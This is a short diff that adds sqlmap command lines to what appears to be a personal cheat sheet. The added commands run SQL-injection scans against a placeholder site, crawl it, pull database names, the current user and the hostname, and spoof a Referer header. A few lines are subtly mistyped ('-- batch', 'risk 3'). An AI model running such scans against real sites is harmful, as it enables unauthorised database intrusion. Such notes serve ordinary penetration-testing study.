@@ -11,6 +11,12 @@
     $ sqlmap -u www.site.com/ --crawl 2 --batch risk 3
     $ sqlmap -u www.site.com/ --crawl 2 --batch risk 3 --level 5
     $ sqlmap -u www.site.com/ --crawl 2 --batch -v 4
+    $ sqlmap -u www.site.com/index.php?id=1 -- batch --dbs --current-user --hostname --current-db
+    
+    $ sqlmap -u www.site.com/ --crawl 2 --batch --output-dir="/home/nazmul/Desktop"
+    $ sqlmap -u www.site.com/ --crawl 2 --batch --header="Referer:www.abc.com" -v 4
+    
+    
     
 
 
